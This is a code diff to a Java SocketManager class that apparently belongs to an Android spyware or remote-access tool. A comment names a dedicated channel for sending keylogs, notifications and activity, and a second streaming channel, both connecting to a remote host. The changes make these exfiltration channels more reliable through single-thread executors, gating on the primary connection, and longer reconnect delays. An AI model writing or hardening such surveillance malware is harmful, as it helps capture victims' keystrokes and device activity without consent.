@@ -57,13 +57,15 @@ public class SocketManager {
     private Socket   streamSocket;
     private PrintWriter streamOut;
     private volatile boolean streamConnected = false;
-    private final ExecutorService streamExecutor = Executors.newCachedThreadPool();
+    // Single-thread executor prevents multiple concurrent stream loops from stacking up
+    private final ExecutorService streamExecutor = Executors.newSingleThreadExecutor();
 
     // Channel 2 (live): dedicated socket for keylogs / notifications / activity
     private Socket   liveSocket;
     private PrintWriter liveOut;
     private volatile boolean liveConnected = false;
-    private final ExecutorService liveExecutor = Executors.newCachedThreadPool();
+    // Single-thread executor prevents multiple concurrent live loops from stacking up
+    private final ExecutorService liveExecutor = Executors.newSingleThreadExecutor();
 
     // Streaming state — event-driven (single-frame on request, idle keepalive)
     private volatile boolean idleFrameMode = false;
@@ -219,6 +221,12 @@ public class SocketManager {
 
     private void streamChannelLoop() {
         while (running) {
+            // Wait until the primary channel is established before opening secondary channels.
+            // This prevents a flood of reconnection attempts when the primary isn't ready yet.
+            if (!connected) {
+                try { Thread.sleep(1000); } catch (InterruptedException ignored) {}
+                continue;
+            }
             try {
                 streamSocket = new Socket(Constants.TCP_HOST, Constants.TCP_PORT);
                 streamSocket.setKeepAlive(true);
@@ -240,7 +248,7 @@ public class SocketManager {
                 java.io.BufferedReader sIn = new java.io.BufferedReader(
                     new java.io.InputStreamReader(streamSocket.getInputStream()));
                 String sLine;
-                while (running && (sLine = sIn.readLine()) != null) {
+                while (running && connected && (sLine = sIn.readLine()) != null) {
                     try {
                         JSONObject incoming = new JSONObject(sLine.trim());
                         if ("device:ping".equals(incoming.optString("event"))) {
@@ -262,7 +270,8 @@ public class SocketManager {
                 streamOut = null;
             }
             if (running) {
-                try { Thread.sleep(Constants.TCP_RECONNECT_DELAY); } catch (InterruptedException ignored) {}
+                // Use a longer delay than primary to avoid thrashing when primary is still reconnecting
+                try { Thread.sleep(Math.max(Constants.TCP_RECONNECT_DELAY, 5000)); } catch (InterruptedException ignored) {}
             }
         }
     }
@@ -290,6 +299,11 @@ public class SocketManager {
 
     private void liveChannelLoop() {
         while (running) {
+            // Wait until the primary channel is established before opening secondary channels.
+            if (!connected) {
+                try { Thread.sleep(1000); } catch (InterruptedException ignored) {}
+                continue;
+            }
             try {
                 liveSocket = new Socket(Constants.TCP_HOST, Constants.TCP_PORT);
                 liveSocket.setKeepAlive(true);
@@ -309,14 +323,14 @@ public class SocketManager {
                 java.io.BufferedReader lIn = new java.io.BufferedReader(
                     new java.io.InputStreamReader(liveSocket.getInputStream()));
                 String lLine;
-                while (running && (lLine = lIn.readLine()) != null) {
+                while (running && connected && (lLine = lIn.readLine()) != null) {
                     try {
                         JSONObject incoming = new JSONObject(lLine.trim());
                         if ("device:ping".equals(incoming.optString("event"))) {
                             JSONObject pong = new JSONObject();
                             pong.put("event", "device:pong");
                             JSONObject pd = new JSONObject();
-                            pd.put("deviceId", DeviceInfo.getDeviceId(context));
+                            pd.put("deviceId", deviceId);
                             pong.put("data", pd);
                             liveOut.print(pong.toString() + "\n");
                             liveOut.flush();
@@ -331,7 +345,7 @@ public class SocketManager {
                 liveOut = null;
             }
             if (running) {
-                try { Thread.sleep(Constants.TCP_RECONNECT_DELAY); } catch (InterruptedException ignored) {}
+                try { Thread.sleep(Math.max(Constants.TCP_RECONNECT_DELAY, 5000)); } catch (InterruptedException ignored) {}
             }
         }
     }
